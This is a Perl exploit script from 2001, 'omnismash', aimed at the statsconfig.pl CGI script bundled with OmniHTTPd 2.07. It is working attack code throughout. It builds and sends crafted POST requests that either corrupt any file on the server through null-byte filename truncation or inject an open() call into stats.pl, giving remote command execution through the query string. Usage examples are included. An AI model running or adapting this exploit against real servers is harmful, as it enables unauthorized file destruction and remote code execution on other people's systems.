#!/usr/bin/perl

######################################################
#                                                    #
# omnismash v1.2 by Joe Testa  [01.08.2001  9:26PM]  #
#              ( joetesta@hushmail.com )             #
#                                                    #
######################################################
#                                                    #
# This program exploits two holes in                 #
# 'statsconfig.pl', a cgi script which is installed  #
# by default by OmniHTTPd v2.07 (and possibly older  #
# versions).                                         #
#                                                    #
# 1.)  Any file on the system may be corrupted,      #
# including those on drives the server does not      #
# reside on.                                         #
#                                                    #
#                                                    #
#   Example:                                         #
#                                                    #
#     perl omnismash.pl localhost 80 -corrupt        #
#                c:\autoexec.bak                     #
#                                                    #
#                                                    #
# 2.)  Code can be injected into                     #
# '/cgi-bin/stats.pl'.  The absolute path to the     #
# the 'cgi-bin' must already be known.               #
#                                                    #
#                                                    #
#   Example:                                         #
#                                                    #
#     perl omnismash.pl localhost 80 -inject         #
#               c:/httpd/cgi-bin                     #
#                                                    #
# This exploit is set to insert a bare 'open()' call #
# to allow command execution like so:                #
#                                                    #
#     http://localhost/cgi-bin/stats.pl?|dir         #
#                                                    #
######################################################


use IO::Socket;


print "\nomnismash v1.2 by Joe Testa  [01.08.2001  9:26PM]\n";
print "             ( joetesta\@hushmail.com )\n\n\n";



if ( scalar @ARGV < 4 ) {
    print "usage:  perl omnismash.pl target port " .
                               "[ -inject cgipath | -corrupt file ]\n";
    exit();
}



$target = $ARGV[ 0 ];
$port = $ARGV[ 1 ];
$inject_or_corrupt = $ARGV[ 2 ];
$stuff = $ARGV[ 3 ];



print "Creating socket... ";
$sock = new IO::Socket::INET( PeerAddr => $target,
                              PeerPort => int( $port ),
                              Proto    => 'tcp' );
die "$!" unless $sock;
print "done.\n";



if ( $inject_or_corrupt eq '-inject' ) {


    $worthless_stuff = "perllib=" . $stuff . "/statsconfig.pl%00&" .
                           "cgidir=" . $stuff;
    
    $more_worthless_stuff = "&deflimit=&mostip=on&mostreq=on&" .
                           "mostbrowsers=on&timelog=on&mostipnum=5&" .
                           "mostreqf=5&mostbrowsernum=5";

    $semi_important_stuff = ";%20if(\$ENV{'QUERY_STRING'})" .
                           "{open(QS,\$ENV{'QUERY_STRING'});}\$a%3D1&" .
                           "logloc=c%3A%2Fhttpd%2Flogs%2Faccess.log&" .
                           "imagebar=%2Fstatsbar.gif&" .
                           "serveradd=%3C%21--%23echo+var%3D&" .
                           "barwidth=100&barheight=5&listpass=&" .
                           "bgcolor=%23FFFFFF&bgimage=&" .
                           "ttBGcolor=%23FFFFDD";

    $exploit = $worthless_stuff . $more_worthless_stuff .
                                                 $semi_important_stuff;


} elsif ( $inject_or_corrupt eq '-corrupt' ) {


    # Cheap hex encoding....
    $stuff =~ s/:/\%3A/g;       # ':' => %3A
    $stuff =~ s/\\/\%2F/g;      # '\' => %2F
    $stuff =~ s/\//\%2F/g;      # '/' => %2F
    $stuff =~ s/ /\%20/g;       # ' ' => %20
    $stuff =~ s/\./%2E/g;       # '.' => %2E



    # This appends a hex-encoded null character to the file to truncate
    # text that is appended to it by statsconfig.pl during processing.

    $stuff .= "%00";


    # Construct the exploit string.  This does nothing more than set
    # the 'perllib' and 'cgidir' fields to our null-padded filename,
    # then add additional fields to pass a series of "if()" checks.

    $worthless_stuff = "&deflimit=&mostip=on&mostreq=on&" .
                       "mostbrowsers=on&timelog=on&mostipnum=5&" .
                       "mostreqf=5&mostbrowsernum=5&" .
                       "logloc=c%3A%2Fhttpd%2Flogs%2Faccess.log&" .
                       "imagebar=%2Fstatsbar.gif&" .
                       "serveradd=%3C%21--%23echo+var%3D&" .
                       "barwidth=100&barheight=5&listpass=&" .
                       "bgcolor=%23FFFFFF&bgimage=&" .
                       "ttBGcolor=%23FFFFDD";

    $exploit = "perllib=" . $stuff . "&cgidir=" . $stuff .
                                                      $worthless_stuff;

}

$length = length( $exploit );



# Write the string to the socket...

print "Sending exploit string... ";
print $sock "POST /cgi-bin/statsconfig.pl HTTP/1.0\n";
print $sock "Content-type: application/x-www-form-urlencoded\n";
print $sock "Content-length: $length\n\n";

print $sock $exploit;
print "done.\n";


# Read result from server...

print "Waiting for response...\n\n";
read( $sock, $buffer, 1024 );
print $buffer;


close( $sock );
exit();